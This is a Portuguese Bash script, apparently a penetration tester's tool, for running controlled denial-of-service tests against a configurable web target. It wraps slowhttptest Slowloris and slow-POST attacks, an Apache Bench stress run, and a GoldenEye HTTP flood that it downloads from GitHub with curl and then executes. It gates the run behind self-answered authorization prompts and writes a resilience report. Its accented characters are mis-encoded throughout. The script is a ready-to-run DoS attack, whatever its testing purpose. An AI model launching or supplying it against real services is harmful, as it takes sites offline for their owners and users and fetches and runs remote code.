#!/bin/bash

################################################################################
# SCRIPT DE TESTE DE RESILIÃŠNCIA DoS/DDoS - CONTROLADO
# Data: 28/11/2025
# Analista: Samuel Ziger
# 
# âš ï¸  ATENÃ‡ÃƒO: EXECUTE APENAS COM AUTORIZAÃ‡ÃƒO FORMAL POR ESCRITO
# âš ï¸  Este script realiza testes que podem causar indisponibilidade temporÃ¡ria
# âš ï¸  Coordene com o cliente antes de executar
################################################################################

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

################################################################################
# CONFIGURAÃ‡ÃƒO - EDITE ANTES DE EXECUTAR
################################################################################

# Alvo do teste (OBTER AUTORIZAÃ‡ÃƒO ANTES)
TARGET_URL="https://example.com/"
TARGET_HOST="example.com"

# Tipo de teste a executar (descomente apenas 1)
TEST_TYPE="slowloris"      # Teste de Slowloris (baixa largura de banda)
#TEST_TYPE="slowhttp"       # Teste de Slow HTTP (POST/headers lentos)
#TEST_TYPE="goldeneye"      # Teste de HTTP flood (mais agressivo)
#TEST_TYPE="stress"         # Teste de stress bÃ¡sico com ab (Apache Bench)

# ConfiguraÃ§Ãµes de intensidade (COMECE BAIXO!)
CONNECTIONS=100            # NÃºmero de conexÃµes simultÃ¢neas (comeÃ§ar baixo)
DURATION=60                # DuraÃ§Ã£o do teste em segundos
WORKERS=10                 # NÃºmero de workers/threads

# DiretÃ³rio de saÃ­da
OUTPUT_DIR="./resultados_ddos_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

# Log
LOG_FILE="$OUTPUT_DIR/ddos_test.log"
exec > >(tee -a "$LOG_FILE") 2>&1

################################################################################
# BANNER DE AVISO
################################################################################

clear
echo -e "${RED}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
echo -e "${RED}â•‘                    âš ï¸  AVISO CRÃTICO âš ï¸                        â•‘${NC}"
echo -e "${RED}â•‘                                                                â•‘${NC}"
echo -e "${RED}â•‘  ESTE SCRIPT EXECUTA TESTES DE NEGAÃ‡ÃƒO DE SERVIÃ‡O (DoS/DDoS)  â•‘${NC}"
echo -e "${RED}â•‘                                                                â•‘${NC}"
echo -e "${RED}â•‘  Executar sem autorizaÃ§Ã£o formal Ã© CRIME CIBERNÃ‰TICO          â•‘${NC}"
echo -e "${RED}â•‘  (Lei 12.737/2012 - Lei Carolina Dieckmann)                    â•‘${NC}"
echo -e "${RED}â•‘                                                                â•‘${NC}"
echo -e "${RED}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"

echo -e "\n${YELLOW}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
echo -e "${YELLOW}CONFIGURAÃ‡ÃƒO ATUAL:${NC}"
echo -e "${BLUE}  Alvo:${NC} $TARGET_URL"
echo -e "${BLUE}  Host:${NC} $TARGET_HOST"
echo -e "${BLUE}  Tipo de Teste:${NC} $TEST_TYPE"
echo -e "${BLUE}  ConexÃµes:${NC} $CONNECTIONS"
echo -e "${BLUE}  DuraÃ§Ã£o:${NC} $DURATION segundos"
echo -e "${BLUE}  Workers:${NC} $WORKERS"
echo -e "${YELLOW}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}\n"

################################################################################
# CHECKLIST DE SEGURANÃ‡A
################################################################################

echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
echo -e "${MAGENTA}â•‘               CHECKLIST DE AUTORIZAÃ‡ÃƒO                         â•‘${NC}"
echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}\n"

read -p "$(echo -e ${YELLOW}[1/6]${NC}) VocÃª possui autorizaÃ§Ã£o FORMAL POR ESCRITO do proprietÃ¡rio do alvo? (sim/nÃ£o): " AUTH1
if [[ ! "$AUTH1" =~ ^[Ss][Ii][Mm]$ ]]; then
    echo -e "${RED}[ABORTADO] AutorizaÃ§Ã£o formal obrigatÃ³ria!${NC}"
    exit 1
fi

read -p "$(echo -e ${YELLOW}[2/6]${NC}) O documento de autorizaÃ§Ã£o estÃ¡ assinado? (sim/nÃ£o): " AUTH2
if [[ ! "$AUTH2" =~ ^[Ss][Ii][Mm]$ ]]; then
    echo -e "${RED}[ABORTADO] Documento de autorizaÃ§Ã£o deve estar assinado!${NC}"
    exit 1
fi

read -p "$(echo -e ${YELLOW}[3/6]${NC}) VocÃª confirmou horÃ¡rio autorizado para o teste com o cliente? (sim/nÃ£o): " AUTH3
if [[ ! "$AUTH3" =~ ^[Ss][Ii][Mm]$ ]]; then
    echo -e "${RED}[ABORTADO] Confirme horÃ¡rio autorizado antes de prosseguir!${NC}"
    exit 1
fi

read -p "$(echo -e ${YELLOW}[4/6]${NC}) O contato tÃ©cnico do cliente estÃ¡ disponÃ­vel agora? (sim/nÃ£o): " AUTH4
if [[ ! "$AUTH4" =~ ^[Ss][Ii][Mm]$ ]]; then
    echo -e "${RED}[ABORTADO] Contato tÃ©cnico deve estar disponÃ­vel durante teste!${NC}"
    exit 1
fi

read -p "$(echo -e ${YELLOW}[5/6]${NC}) Cliente possui backup recente do sistema? (sim/nÃ£o): " AUTH5
if [[ ! "$AUTH5" =~ ^[Ss][Ii][Mm]$ ]]; then
    echo -e "${YELLOW}[AVISO] Recomenda-se backup antes de teste de DoS!${NC}"
    read -p "Deseja continuar mesmo assim? (sim/nÃ£o): " CONTINUE
    if [[ ! "$CONTINUE" =~ ^[Ss][Ii][Mm]$ ]]; then
        exit 1
    fi
fi

read -p "$(echo -e ${YELLOW}[6/6]${NC}) Cliente foi informado que o teste PODE CAUSAR INDISPONIBILIDADE? (sim/nÃ£o): " AUTH6
if [[ ! "$AUTH6" =~ ^[Ss][Ii][Mm]$ ]]; then
    echo -e "${RED}[ABORTADO] Cliente deve estar ciente dos riscos!${NC}"
    exit 1
fi

echo -e "\n${GREEN}âœ“ Checklist de autorizaÃ§Ã£o completo!${NC}\n"

# ConfirmaÃ§Ã£o final
echo -e "${RED}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
echo -e "${RED}â•‘                    CONFIRMAÃ‡ÃƒO FINAL                           â•‘${NC}"
echo -e "${RED}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}\n"

echo -e "${YELLOW}Alvo que serÃ¡ testado:${NC} ${RED}$TARGET_URL${NC}"
echo -e "${YELLOW}Intensidade:${NC} ${RED}$CONNECTIONS conexÃµes por $DURATION segundos${NC}\n"

read -p "Digite 'CONFIRMO' (em MAIÃšSCULAS) para iniciar o teste: " FINAL_CONFIRM

if [ "$FINAL_CONFIRM" != "CONFIRMO" ]; then
    echo -e "${YELLOW}[CANCELADO] Teste abortado pelo usuÃ¡rio.${NC}"
    exit 0
fi

################################################################################
# FUNÃ‡ÃƒO: Verificar ferramentas necessÃ¡rias
################################################################################

check_tool() {
    if ! command -v $1 &> /dev/null; then
        echo -e "${RED}[ERRO] $1 nÃ£o encontrado!${NC}"
        echo -e "${YELLOW}Instale com: sudo apt install $2${NC}"
        return 1
    else
        echo -e "${GREEN}[OK] $1 instalado${NC}"
        return 0
    fi
}

################################################################################
# VERIFICAÃ‡ÃƒO DE FERRAMENTAS
################################################################################

echo -e "\n${BLUE}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
echo -e "${BLUE}Verificando ferramentas necessÃ¡rias...${NC}"
echo -e "${BLUE}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}\n"

TOOLS_OK=true

case $TEST_TYPE in
    "slowloris")
        check_tool "slowhttptest" "slowhttptest" || TOOLS_OK=false
        ;;
    "slowhttp")
        check_tool "slowhttptest" "slowhttptest" || TOOLS_OK=false
        ;;
    "goldeneye")
        check_tool "python3" "python3" || TOOLS_OK=false
        echo -e "${YELLOW}[INFO] SerÃ¡ baixado GoldenEye do GitHub${NC}"
        ;;
    "stress")
        check_tool "ab" "apache2-utils" || TOOLS_OK=false
        ;;
esac

check_tool "curl" "curl" || TOOLS_OK=false

if [ "$TOOLS_OK" = false ]; then
    echo -e "\n${RED}[ERRO] Instale as ferramentas necessÃ¡rias antes de continuar!${NC}"
    exit 1
fi

echo -e "\n${GREEN}âœ“ Todas as ferramentas estÃ£o instaladas!${NC}\n"

################################################################################
# TESTE DE CONECTIVIDADE PRÃ‰VIA
################################################################################

echo -e "${BLUE}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
echo -e "${BLUE}Testando conectividade com o alvo...${NC}"
echo -e "${BLUE}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}\n"

# Teste inicial de disponibilidade
echo "# Baseline - Verificando se alvo estÃ¡ acessÃ­vel..."
BASELINE_START=$(date +%s%N)
BASELINE_STATUS=$(curl -I -s -m 10 "$TARGET_URL" 2>&1 | grep "HTTP" | awk '{print $2}' | head -1)
BASELINE_END=$(date +%s%N)
BASELINE_TIME=$(( ($BASELINE_END - $BASELINE_START) / 1000000 ))

echo "Status inicial: $BASELINE_STATUS"
echo "Tempo de resposta: ${BASELINE_TIME}ms"

if [ -z "$BASELINE_STATUS" ]; then
    echo -e "${RED}[ERRO] Alvo nÃ£o responde! Verifique URL e conectividade.${NC}"
    exit 1
fi

# Salvar baseline
cat > "$OUTPUT_DIR/baseline.txt" << EOF
Teste de Baseline - Antes do Ataque
====================================
Data: $(date)
URL: $TARGET_URL
Status HTTP: $BASELINE_STATUS
Tempo de Resposta: ${BASELINE_TIME}ms

EOF

echo -e "${GREEN}âœ“ Alvo estÃ¡ acessÃ­vel. Baseline salvo.${NC}\n"

################################################################################
# CONTAGEM REGRESSIVA
################################################################################

echo -e "${YELLOW}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
echo -e "${YELLOW}Iniciando teste em:${NC}"
echo -e "${YELLOW}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}\n"

for i in {10..1}; do
    echo -ne "${RED}$i...${NC} "
    sleep 1
done
echo -e "\n"

################################################################################
# EXECUÃ‡ÃƒO DO TESTE
################################################################################

echo -e "${RED}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
echo -e "${RED}â•‘                    TESTE INICIADO                              â•‘${NC}"
echo -e "${RED}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}\n"

TEST_START=$(date)
echo "InÃ­cio do teste: $TEST_START"

case $TEST_TYPE in
    ################################################################################
    # SLOWLORIS
    ################################################################################
    "slowloris")
        echo -e "${YELLOW}[*] Executando teste Slowloris...${NC}\n"
        
        slowhttptest -c $CONNECTIONS \
            -H \
            -g \
            -o "$OUTPUT_DIR/slowloris" \
            -i 10 \
            -r 200 \
            -t GET \
            -u "$TARGET_URL" \
            -x 24 \
            -p 3 \
            -l $DURATION \
            2>&1 | tee "$OUTPUT_DIR/slowloris_output.txt"
        
        echo -e "\n${GREEN}[OK] Teste Slowloris concluÃ­do!${NC}"
        echo -e "${BLUE}RelatÃ³rio HTML: $OUTPUT_DIR/slowloris.html${NC}"
        echo -e "${BLUE}RelatÃ³rio CSV: $OUTPUT_DIR/slowloris.csv${NC}"
        ;;
    
    ################################################################################
    # SLOW HTTP (POST/Headers)
    ################################################################################
    "slowhttp")
        echo -e "${YELLOW}[*] Executando teste Slow HTTP...${NC}\n"
        
        slowhttptest -c $CONNECTIONS \
            -B \
            -g \
            -o "$OUTPUT_DIR/slowhttp" \
            -i 10 \
            -r 200 \
            -s 8192 \
            -t POST \
            -u "$TARGET_URL" \
            -x 24 \
            -p 3 \
            -l $DURATION \
            2>&1 | tee "$OUTPUT_DIR/slowhttp_output.txt"
        
        echo -e "\n${GREEN}[OK] Teste Slow HTTP concluÃ­do!${NC}"
        echo -e "${BLUE}RelatÃ³rio HTML: $OUTPUT_DIR/slowhttp.html${NC}"
        echo -e "${BLUE}RelatÃ³rio CSV: $OUTPUT_DIR/slowhttp.csv${NC}"
        ;;
    
    ################################################################################
    # GOLDENEYE (HTTP Flood)
    ################################################################################
    "goldeneye")
        echo -e "${YELLOW}[*] Baixando GoldenEye...${NC}\n"
        
        if [ ! -f "$OUTPUT_DIR/goldeneye.py" ]; then
            curl -s -o "$OUTPUT_DIR/goldeneye.py" \
                https://raw.githubusercontent.com/jseidl/GoldenEye/master/goldeneye.py
            chmod +x "$OUTPUT_DIR/goldeneye.py"
        fi
        
        echo -e "${YELLOW}[*] Executando teste GoldenEye (HTTP Flood)...${NC}\n"
        
        timeout ${DURATION}s python3 "$OUTPUT_DIR/goldeneye.py" "$TARGET_URL" \
            -w $WORKERS \
            -s $CONNECTIONS \
            -m post \
            2>&1 | tee "$OUTPUT_DIR/goldeneye_output.txt"
        
        echo -e "\n${GREEN}[OK] Teste GoldenEye concluÃ­do!${NC}"
        ;;
    
    ################################################################################
    # STRESS TEST (Apache Bench)
    ################################################################################
    "stress")
        echo -e "${YELLOW}[*] Executando teste de stress com Apache Bench...${NC}\n"
        
        TOTAL_REQUESTS=$(( $CONNECTIONS * 10 ))
        
        ab -n $TOTAL_REQUESTS \
            -c $CONNECTIONS \
            -t $DURATION \
            -g "$OUTPUT_DIR/ab_gnuplot.tsv" \
            "$TARGET_URL" \
            2>&1 | tee "$OUTPUT_DIR/ab_output.txt"
        
        echo -e "\n${GREEN}[OK] Teste de stress concluÃ­do!${NC}"
        echo -e "${BLUE}RelatÃ³rio: $OUTPUT_DIR/ab_output.txt${NC}"
        ;;
esac

TEST_END=$(date)
echo -e "\nFim do teste: $TEST_END"

################################################################################
# VERIFICAÃ‡ÃƒO PÃ“S-TESTE
################################################################################

echo -e "\n${BLUE}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
echo -e "${BLUE}Aguardando 30 segundos antes de verificar recuperaÃ§Ã£o...${NC}"
echo -e "${BLUE}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}\n"

sleep 30

echo "# Verificando se serviÃ§o se recuperou..."
RECOVERY_START=$(date +%s%N)
RECOVERY_STATUS=$(curl -I -s -m 10 "$TARGET_URL" 2>&1 | grep "HTTP" | awk '{print $2}' | head -1)
RECOVERY_END=$(date +%s%N)
RECOVERY_TIME=$(( ($RECOVERY_END - $RECOVERY_START) / 1000000 ))

echo "Status pÃ³s-teste: $RECOVERY_STATUS"
echo "Tempo de resposta: ${RECOVERY_TIME}ms"

# Salvar recovery
cat >> "$OUTPUT_DIR/baseline.txt" << EOF

Teste de RecuperaÃ§Ã£o - ApÃ³s o Ataque
=====================================
Data: $(date)
Status HTTP: $RECOVERY_STATUS
Tempo de Resposta: ${RECOVERY_TIME}ms

ComparaÃ§Ã£o:
-----------
Baseline: ${BASELINE_STATUS} (${BASELINE_TIME}ms)
Recovery: ${RECOVERY_STATUS} (${RECOVERY_TIME}ms)
DegradaÃ§Ã£o: $(( $RECOVERY_TIME - $BASELINE_TIME ))ms

EOF

if [ "$RECOVERY_STATUS" = "$BASELINE_STATUS" ]; then
    echo -e "${GREEN}âœ“ ServiÃ§o recuperado completamente!${NC}"
else
    echo -e "${RED}âœ— ServiÃ§o ainda apresenta problemas!${NC}"
    echo -e "${YELLOW}Notifique o contato tÃ©cnico do cliente IMEDIATAMENTE!${NC}"
fi

################################################################################
# RELATÃ“RIO FINAL
################################################################################

cat > "$OUTPUT_DIR/RELATORIO_DDOS.md" << EOF
# RelatÃ³rio de Teste de ResiliÃªncia DoS/DDoS

**Data:** $(date)
**Analista:** Samuel Ziger
**Alvo:** $TARGET_URL

---

## ðŸ“‹ InformaÃ§Ãµes do Teste

| Campo | Valor |
|-------|-------|
| **Tipo de Teste** | $TEST_TYPE |
| **ConexÃµes SimultÃ¢neas** | $CONNECTIONS |
| **DuraÃ§Ã£o** | $DURATION segundos |
| **Workers** | $WORKERS |
| **InÃ­cio** | $TEST_START |
| **Fim** | $TEST_END |

---

## ðŸ“Š Resultados

### Baseline (Antes do Ataque)
- **Status HTTP:** $BASELINE_STATUS
- **Tempo de Resposta:** ${BASELINE_TIME}ms

### RecuperaÃ§Ã£o (ApÃ³s 30s)
- **Status HTTP:** $RECOVERY_STATUS
- **Tempo de Resposta:** ${RECOVERY_TIME}ms
- **DegradaÃ§Ã£o:** $(( $RECOVERY_TIME - $BASELINE_TIME ))ms

---

## ðŸ“ˆ AnÃ¡lise

EOF

# AnÃ¡lise automÃ¡tica
if [ "$RECOVERY_STATUS" = "$BASELINE_STATUS" ]; then
    cat >> "$OUTPUT_DIR/RELATORIO_DDOS.md" << EOF
### âœ… ResiliÃªncia Adequada

O serviÃ§o recuperou-se completamente apÃ³s o teste:
- Status HTTP mantido: $BASELINE_STATUS
- Tempo de resposta: ${RECOVERY_TIME}ms

**ConclusÃ£o:** O alvo demonstrou boa resiliÃªncia ao ataque de $TEST_TYPE.

EOF
else
    cat >> "$OUTPUT_DIR/RELATORIO_DDOS.md" << EOF
### âš ï¸ Vulnerabilidade Detectada

O serviÃ§o **NÃƒO** recuperou-se completamente:
- Status mudou de $BASELINE_STATUS para $RECOVERY_STATUS
- DegradaÃ§Ã£o de performance: $(( $RECOVERY_TIME - $BASELINE_TIME ))ms

**ConclusÃ£o:** O alvo Ã© vulnerÃ¡vel a ataques de $TEST_TYPE.

### ðŸ”§ RecomendaÃ§Ãµes

1. Implementar rate limiting no servidor de origem
2. Ajustar timeouts de conexÃ£o
3. Configurar Cloudflare/WAF com regras anti-DDoS
4. Implementar limites de conexÃµes por IP
5. Habilitar SYN cookies (proteÃ§Ã£o TCP)

EOF
fi

# Adicionar evidÃªncias
cat >> "$OUTPUT_DIR/RELATORIO_DDOS.md" << EOF

---

## ðŸ“ Arquivos de EvidÃªncia

EOF

ls -lh "$OUTPUT_DIR" | grep -v "^d" | awk '{print "- " $9 " (" $5 ")"}' >> "$OUTPUT_DIR/RELATORIO_DDOS.md"

cat >> "$OUTPUT_DIR/RELATORIO_DDOS.md" << EOF

---

## âš–ï¸ DeclaraÃ§Ã£o de AutorizaÃ§Ã£o

Este teste foi executado com autorizaÃ§Ã£o formal do proprietÃ¡rio do sistema.
Documento de autorizaÃ§Ã£o em posse do analista.

**Assinaturas do Checklist:**
- AutorizaÃ§Ã£o formal: SIM
- Documento assinado: SIM
- HorÃ¡rio confirmado: SIM
- Contato tÃ©cnico disponÃ­vel: SIM
- Backup disponÃ­vel: ${AUTH5}
- Cliente ciente dos riscos: SIM

---

**Fim do RelatÃ³rio**
EOF

################################################################################
# FINALIZAÃ‡ÃƒO
################################################################################

echo -e "\n${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
echo -e "${GREEN}â•‘                  TESTE CONCLUÃDO COM SUCESSO                   â•‘${NC}"
echo -e "${GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}\n"

echo -e "${BLUE}ðŸ“ Resultados salvos em:${NC} $OUTPUT_DIR"
echo -e "${BLUE}ðŸ“„ RelatÃ³rio principal:${NC} $OUTPUT_DIR/RELATORIO_DDOS.md"
echo -e "${BLUE}ðŸ“Š Log de execuÃ§Ã£o:${NC} $LOG_FILE"

echo -e "\n${YELLOW}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
echo -e "${YELLOW}PRÃ“XIMOS PASSOS:${NC}"
echo -e "1. Revisar $OUTPUT_DIR/RELATORIO_DDOS.md"
echo -e "2. Analisar grÃ¡ficos/CSVs gerados"
echo -e "3. Notificar cliente sobre resultados"
echo -e "4. Arquivar evidÃªncias de forma segura"
echo -e "${YELLOW}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}\n"

echo -e "${MAGENTA}Teste finalizado em: $(date)${NC}\n"
